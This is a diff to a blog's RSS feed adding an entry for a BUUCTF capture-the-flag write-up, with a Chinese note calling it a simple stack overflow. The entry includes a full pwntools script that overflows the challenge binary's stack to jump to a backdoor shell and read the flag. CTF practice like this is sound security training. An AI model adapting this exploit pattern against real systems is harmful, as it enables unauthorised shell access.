@@ -262,6 +262,16 @@ x地址为0x0804a02c，.data有读写权限
     </item>
     
     <item>
+      <title>BUUCTF Pwn Bjdctf_2020_babystack</title>
+      <link>https://niceseven.github.io/post/2020/04/03/buuctf-pwn-bjdctf_2020_babystack/</link>
+      <pubDate>Fri, 03 Apr 2020 21:23:43 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/04/03/buuctf-pwn-bjdctf_2020_babystack/</guid>
+      <description>BUUCTF Pwn Bjdctf_2020_babystack 64位程序开启NX，有system(&amp;quot;/bin/sh&amp;quot;)，简单栈溢出
+#!/usr/bin/env python2 #-*- coding=UTF-8 -*- from pwn import * context.log_level = &amp;#39;debug&amp;#39; sh = process(&amp;#39;./bjdctf_2020_babystack&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,26495) backdoor_addr = 0x4006e6 readsize = 30 offset = 0x10 + 0x8 sh.sendlineafter(&amp;#34;name:&amp;#34;,&amp;#39;30&amp;#39;) payload = &amp;#39;a&amp;#39;*offset + p64(backdoor_addr) sh.sendlineafter(&amp;#34;name?&amp;#34;,payload) sh.sendline(&amp;#34;cat flag&amp;#34;) sh.interactive() </description>
+    </item>
+    
+    <item>
       <title>BUUCTF Pwn [Black Watch 入群题]PWN</title>
       <link>https://niceseven.github.io/post/2020/04/01/buuctf-pwn-black-watch-%E5%85%A5%E7%BE%A4%E9%A2%98pwn/</link>
       <pubDate>Wed, 01 Apr 2020 21:56:14 +0800</pubDate>
